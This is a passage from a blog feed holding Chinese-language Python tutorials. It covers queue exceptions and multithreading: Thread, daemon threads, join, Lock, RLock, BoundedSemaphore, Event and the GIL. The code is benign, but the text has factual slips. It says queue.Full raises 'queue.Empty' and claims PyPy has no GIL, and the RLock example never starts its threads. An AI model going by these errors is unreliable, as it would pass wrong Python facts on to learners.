在队列中插入元素 'python-100'</span></span><br><span class="line">print(q.empty())  <span class="comment"># 对列不为空，返回 False</span></span><br></pre></td></tr></table></figure><p>⑦ <code>q.full()</code></p><blockquote><p>如果队列中元素个数达到上限，返回 True，否则返回 False。</p></blockquote><h4 id="2queue-的异常"><a class="markdownIt-Anchor" href="#2queue-的异常"></a> 2.queue 的异常</h4><p>① <code>queue.Full 异常</code></p><blockquote><p>当队列数据元素容量达到上限时，继续往队列中放入数据会引发 queue.Empty 异常，主要是不正当使用 put() 和 put_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    q.put(<span class="string">'stay hungry, stay foolish'</span>, block=<span class="keyword">False</span>)  <span class="comment"># 队列已满，继续往队列中放入数据，引发 queue.Full 异常</span></span><br><span class="line"><span class="keyword">except</span> queue.Full:</span><br><span class="line">    print(<span class="string">'queue.Full'</span>)</span><br></pre></td></tr></table></figure><p>② <code>queue.Empty 异常</code></p><blockquote><p>当队列中没有数据元素时，取出队列中的数据会引发 queue.Empty 异常，主要是不正当使用 get() 和 get_nowait() 引起的。</p></blockquote><p>示例如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    q = queue.Queue(<span class="number">3</span>)  <span class="comment"># 设置队列上限为3</span></span><br><span class="line">    q.put(<span class="string">'python'</span>)  <span class="comment"># 在队列中插入字符串 'python'</span></span><br><span class="line">    q.put(<span class="string">'-'</span>) <span class="comment"># 在队列中插入字符串 '-'</span></span><br><span class="line">    q.put(<span class="string">'100'</span>) <span class="comment"># 在队列中插入字符串 '100'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):  <span class="comment"># 从队列中取数据，取出次数为4次，引发 queue.Empty 异常</span></span><br><span class="line">        print(q.get(block=<span class="keyword">False</span>))</span><br><span class="line"><span class="keyword">except</span> queue.Empty:</span><br><span class="line">    print(<span class="string">'queue.Empty'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x01-requests-库font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x01-requests-库font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python多线程介绍</title>
    <link href="https://muzibing.github.io/2020/09/04/2020.09.04%EF%BC%88149%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/04/2020.09.04（149）/</id>
    <published>2020-09-03T16:00:00.000Z</published>
    <updated>2020-09-05T12:16:15.785Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-什么是多线程font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是多线程font"></a> <font color="navy">0x00 什么是多线程？</font></h3><blockquote><p><font size="2">在计算机编程中，一个基本的概念就是同时对多个任务加以控制。许多程序设计问题都要求程序能够停下手头的工作，改为处理其他一些问题，再返回主进程。可以通过多种途径达到这个目的。最开始的时候，那些掌握机器低级语言的程序员编写一些“中断服务例程”，主进程的暂停是通过硬件级的中断实现的。尽管这是一种有用的方法，但编出的程序很难移植，由此造成了另一类的代价高昂问题。中断对那些实时性很强的任务来说是很有必要的。但对于其他许多问题，只要求将问题划分进入独立运行的程序片断中，使整个程序能更迅速地响应用户的请求。<br>**最开始，线程只是用于分配单个处理器的处理时间的一种工具。但假如操作系统本身支持多个处理器，那么每个线程都可分配给一个不同的处理器，真正进入“并行运算”状态。**从程序设计语言的角度看，多线程操作最有价值的特性之一就是程序员不必关心到底使用了多少个处理器。程序在逻辑意义上被分割为数个线程;假如机器本身安装了多个处理器，那么程序会运行得更快，毋需作出任何特殊的调校。根据前面的论述，大家可能感觉线程处理非常简单。但必须注意一个问题：共享资源!如果有多个线程同时运行，而且它们试图访问相同的资源，就会遇到一个问题。举个例子来说，两个线程不能将信息同时发送给一台打印机。为解决这个问题，对那些可共享的资源来说(比如打印机)，它们在使用期间必须进入锁定状态。所以一个线程可将资源锁定，在完成了它的任务后，再解开(释放)这个锁，使其他线程可以接着使用同样的资源。<br>多线程是为了同步完成多项任务，不是为了提高运行效率，而是为了提高资源使用效率来提高系统的效率。线程是在同一时间需要完成多项任务的时候实现的。<br>一个采用了多线程技术的应用程序可以更好地利用系统资源。其主要优势在于充分利用了CPU的空闲时间片，可以用尽可能少的时间来对用户的要求做出响应，使得进程的整体运行效率得到较大提高，同时增强了应用程序的灵活性。更为重要的是，由于同一进程的所有线程是共享同一内存，所以不需要特殊的数据传送机制，不需要建立共享存储区或共享文件，从而使得不同任务之间的协调操作与运行、数据的交互、资源的分配等问题更加易于解决。</font></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading <span class="keyword">from</span> threading <span class="keyword">import</span> Lock,Thread <span class="keyword">import</span> time,os</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-python多线程详解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-python多线程详解font"></a> <font color="navy">0x01 python多线程详解</font></h3><h4 id="1什么是线程"><a class="markdownIt-Anchor" href="#1什么是线程"></a> 1.什么是线程？</h4><p>线程也叫轻量级进程，是操作系统能够进行运算调度的最小单位，它被包涵在进程之中，是进程中的实际运作单位。线程自己不拥有系统资源，只拥有一点儿在运行中必不可少的资源，但它可与同属一个进程的其他线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一个进程中的多个线程之间可以并发执行。</p><h4 id="2为什么要使用多线程"><a class="markdownIt-Anchor" href="#2为什么要使用多线程"></a> 2.为什么要使用多线程？</h4><p>线程在程序中是独立的、并发的执行流。与分隔的进程相比，进程中线程之间的隔离程度要小，它们共享内存、文件句柄    和其他进程应有的状态。    因为线程的划分尺度小于进程，使得多线程程序的并发性高。进程在执行过程之中拥有独立的内存单元，而多个线程共享    内存，从而极大的提升了程序的运行效率。</p><p>线程比进程具有更高的性能，这是由于同一个进程中的线程都有共性，多个线程共享一个进程的虚拟空间。线程的共享环境    包括进程代码段、进程的共有数据等，利用这些共享的数据，线程之间很容易实现通信。操作系统在创建进程时，必须为改进程分配独立的内存空间，并分配大量的相关资源，但创建线程则简单得多。因此，使用多线程 来实现并发比使用多进程的性能高得要多。</p><blockquote><p>总结起来，使用多线程编程具有如下几个优点：</p><ul><li>进程之间不能共享内存，但线程之间共享内存非常容易。</li><li>操作系统在创建进程时，需要为该进程重新分配系统资源，但创建线程的代价则小得多。因此使用多线程来实现多任务并发执行比使用多进程的效率高 。</li><li>python语言内置了多线程功能支持，而不是单纯地作为底层操作系统的调度方式，从而简化了python的多线程编程。</li></ul></blockquote><h4 id="3普通创建方式"><a class="markdownIt-Anchor" href="#3普通创建方式"></a> 3.普通创建方式</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'0s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=run,args=(<span class="string">'t1'</span>,))     <span class="comment"># target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在</span></span><br><span class="line">    t2 = threading.Thread(target=run,args=(<span class="string">'t2'</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="4自定义线程"><a class="markdownIt-Anchor" href="#4自定义线程"></a> 4.自定义线程</h4><blockquote><p>继承threading.Thread来定义线程类，其本质是重构Thread类中的run方法</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,n)</span>:</span></span><br><span class="line">        super(MyThread,self).__init__()   <span class="comment">#重构run函数必须写</span></span><br><span class="line">        self.n = n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'task'</span>,self.n)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'2s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'1s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'0s'</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = MyThread(<span class="string">'t1'</span>)</span><br><span class="line">    t2 = MyThread(<span class="string">'t2'</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h4 id="5守护线程"><a class="markdownIt-Anchor" href="#5守护线程"></a> 5.守护线程</h4><p>下面这个例子，这里使用setDaemon(True)把所有的子线程都变成了主线程的守护线程，因此当主线程结束后&lt;子线程也会随之结束，所以当主线程结束后，整个程序就退出了。</p><blockquote><p>所谓’线程守护’，就是主线程不管该线程的执行情况，只要是其他子线程结束且主线程执行完毕，主线程都会关闭。也就是说:主线程不等待该守护线程的执行完再去关闭。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'2s'</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>通过执行结果可以看出，设置守护线程之后，当主线程结束时，子线程也将立即结束，不再执行 ‘’’ ‘’’</p></blockquote><h4 id="6主线程等待子线程结束"><a class="markdownIt-Anchor" href="#6主线程等待子线程结束"></a> 6.主线程等待子线程结束</h4><p>为了让守护线程执行结束之后，主线程再结束，我们可以使用join方法，让主线程等待子线程执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(<span class="string">'task'</span>,n)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'5s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'3s'</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'1s'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t=threading.Thread(target=run,args=(<span class="string">'t1'</span>,))</span><br><span class="line">    t.setDaemon(<span class="keyword">True</span>)    <span class="comment">#把子线程设置为守护线程，必须在start()之前设置</span></span><br><span class="line">    t.start()</span><br><span class="line">    t.join()     <span class="comment">#设置主线程等待子线程结束</span></span><br><span class="line">    print(<span class="string">'end'</span>)</span><br></pre></td></tr></table></figure><h4 id="7多线程共享全局变量"><a class="markdownIt-Anchor" href="#7多线程共享全局变量"></a> 7.多线程共享全局变量</h4><p>线程时进程的执行单元，进程时系统分配资源的最小执行单位，所以在同一个进程中的多线程是共享资源的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">g_num = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span>  g_num</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        g_num+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">'in work1 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> g_num</span><br><span class="line">    print(<span class="string">'in work2 g_num is : %d'</span> % g_num)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t1 = threading.Thread(target=work1)</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    t2=threading.Thread(target=work2)</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p>由于线程之间是进行随机调度，并且每个线程可能只执行n条执行之后，当多个线程同时修改同一条数据时可能会出现脏数据，    所以出现了线程锁，即同一时刻允许一个线程执行操作。线程锁用于锁定资源，可以定义多个锁，像下面的代码，当需要独占    某一个资源时，任何一个锁都可以锁定这个资源，就好比你用不同的锁都可以把这个相同的门锁住一样。  由于线程之间是进行随机调度的，如果有多个线程同时操作一个对象，如果没有很好地保护该对象，会造成程序结果的不可预期， 我们因此也称为“线程不安全”。 为了防止上面情况的发生，就出现了互斥锁（Lock）</p><h4 id="8互斥锁lock"><a class="markdownIt-Anchor" href="#8互斥锁lock"></a> 8.互斥锁（Lock）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> n</span><br><span class="line">    lock.acquire()</span><br><span class="line">    temp = n</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    n = temp<span class="number">-1</span></span><br><span class="line">    lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line">    n = <span class="number">100</span></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        p = Thread(target=work)</span><br><span class="line">        l.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><h4 id="9递归锁"><a class="markdownIt-Anchor" href="#9递归锁"></a> 9.递归锁</h4><p>RLcok类的用法和Lock类一模一样，但它支持嵌套，在多个锁没有释放的时候一般会使用RLock类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(lock)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gl_num</span><br><span class="line">    lock.acquire()</span><br><span class="line">    gl_num += <span class="number">1</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(gl_num)</span><br><span class="line">    lock.release()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    gl_num = <span class="number">0</span></span><br><span class="line">    lock = threading.RLock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        t = threading.Thread(target=func,args=(lock,))</span><br><span class="line"><span class="comment">#         t.start()</span></span><br></pre></td></tr></table></figure><h4 id="10信号量boundedsemaphore类"><a class="markdownIt-Anchor" href="#10信号量boundedsemaphore类"></a> 10.信号量（BoundedSemaphore类）</h4><p>互斥锁同时只允许一个线程更改数据，而Semaphore是同时允许一定数量的线程更改数据，比如厕所有3个坑，那最多只允许3个人上厕所，后面的人只能等里面有人出来了才能再进去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(n,semaphore)</span>:</span></span><br><span class="line">    semaphore.acquire()   <span class="comment">#加锁</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'run the thread:%s\n'</span> % n)</span><br><span class="line">    semaphore.release()    <span class="comment">#释放</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    num=<span class="number">0</span></span><br><span class="line">    semaphore = threading.BoundedSemaphore(<span class="number">5</span>)   <span class="comment">#最多允许5个线程同时运行</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">        t = threading.Thread(target=run,args=(<span class="string">'t-%s'</span> % i,semaphore))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">while</span> threading.active_count() !=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'----------all threads done-----------'</span>)</span><br></pre></td></tr></table></figure><h4 id="11事件"><a class="markdownIt-Anchor" href="#11事件"></a> 11.事件</h4><p>python线程的事件用于主线程控制其他线程的执行，事件是一个简单的线程同步对象，其主要提供以下的几个方法：</p><ul><li>clear将flag设置为 False</li><li>set将flag设置为 True</li><li>is_set判断是否设置了flag</li><li>wait会一直监听flag，如果没有检测到flag就一直处于阻塞状态</li></ul><p>事件处理的机制：全局定义了一个Flag，当Flag的值为False，那么event.wait()就会阻塞，当flag值为True，那么event.wait()便不再阻塞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">event = threading.Event()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lighter</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    event.set()         <span class="comment">#初始者为绿灯</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="number">5</span> &lt; count &lt;=<span class="number">10</span>:</span><br><span class="line">            event.clear()  <span class="comment">#红灯，清除标志位</span></span><br><span class="line">            print(<span class="string">"\33[41;lmred light is on...\033[0m]"</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; <span class="number">10</span>:</span><br><span class="line">            event.set()    <span class="comment">#绿灯，设置标志位</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\33[42;lmgreen light is on...\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">car</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> event.is_set():     <span class="comment">#判断是否设置了标志位</span></span><br><span class="line">            print(<span class="string">'[%s] running.....'</span>%name)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[%s] sees red light,waiting...'</span>%name)</span><br><span class="line">            event.wait()</span><br><span class="line">            print(<span class="string">'[%s] green light is on,start going...'</span>%name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># startTime = time.time()</span></span><br><span class="line">light = threading.Thread(target=lighter,)</span><br><span class="line">light.start()</span><br><span class="line"></span><br><span class="line">car = threading.Thread(target=car,args=(<span class="string">'MINT'</span>,))</span><br><span class="line">car.start()</span><br><span class="line">endTime = time.time()</span><br><span class="line"><span class="comment"># print('用时：',endTime-startTime)</span></span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-gil-全局解释器-font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-gil-全局解释器-font"></a> <font color="navy">0x02 GIL  全局解释器 </font></h3><blockquote><p>在非python环境中，单核情况下，同时只能有一个任务执行。多核时可以支持多个线程同时执行。但是在python中，无论有多少个核        同时只能执行一个线程。究其原因，这就是由于GIL的存在导致的。GIL的全程是全局解释器，来源是python设计之初的考虑，为了数据安全所做的决定。某个线程想要执行，必须先拿到GIL，我们可以把GIL看做是“通行证”，并且在一个python进程之中，GIL只有一个。拿不到线程的通行证，并且在一个python进程中，GIL只有一个，拿不到通行证的线程，就不允许进入CPU执行。GIL只在cpython中才有，因为cpython调用的是c语言的原生线程，所以他不能直接操作cpu，而只能利用GIL保证同一时间只能有一个线程拿到数据。而在pypy和jpython中是没有GIL的python在使用多线程的时候，调用的是c语言的原生过程。</p></blockquote><p>python针对不同类型的代码执行效率也是不同的：</p><ol><li><p>CPU密集型代码（各种循环处理、计算等），在这种情况下，由于计算工作多，ticks技术很快就会达到阀值，然后出发GIL的释放与再竞争（多个线程来回切换当然是需要消耗资源的），所以python下的多线程对CPU密集型代码并不友好。</p></li><li><p>IO密集型代码（文件处理、网络爬虫等设计文件读写操作），多线程能够有效提升效率（单线程下有IO操作会进行IO等待，造成不必要的时间浪费，而开启多线程能在线程A等待时，自动切换到线程B，可以不浪费CPU的资源，从而能提升程序的执行 效率）。所以python的多线程对IO密集型代码比较友好。 ‘’’ ‘’’</p></li></ol><blockquote><p>主要要看任务的类型，我们把任务分为I/O密集型和计算密集型，而多线程在切换中又分为I/O切换和时间切换。如果任务属于是I/O密集型，    若不采用多线程，我们在进行I/O操作时，势必要等待前面一个I/O任务完成后面的I/O任务才能进行，在这个等待的过程中，CPU处于等待    状态，这时如果采用多线程的话，刚好可以切换到进行另一个I/O任务。这样就刚好可以充分利用CPU避免CPU处于闲置状态，提高效率。但是    如果多线程任务都是计算型，CPU会一直在进行工作，直到一定的时间后采取多线程时间切换的方式进行切换线程，此时CPU一直处于工作状态，    此种情况下并不能提高性能，相反在切换多线程任务时，可能还会造成时间和资源的浪费，导致效能下降。这就是造成上面两种多线程结果不能的解释。</p></blockquote><p><strong>结论</strong>：<font color="red">I/O密集型任务，建议采取多线程，还可以采用多进程+协程的方式(例如:爬虫多采用多线程处理爬取的数据)；对于计算密集型任务，python此时就不适用了。</font></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-什么是多线程font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-什么是多线程font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;0x00 什么是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tmux工具使用总结</title>
    <link href="https://muzibing.github.io/2020/08/29/2020.08.29%EF%BC%88147%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/08/29/2020.08.29（147）/</id>
    <published>2020-08-28T16:00:00.000Z</published>
    <updated>2020-08-29T08:31:38.019Z</updated>
    
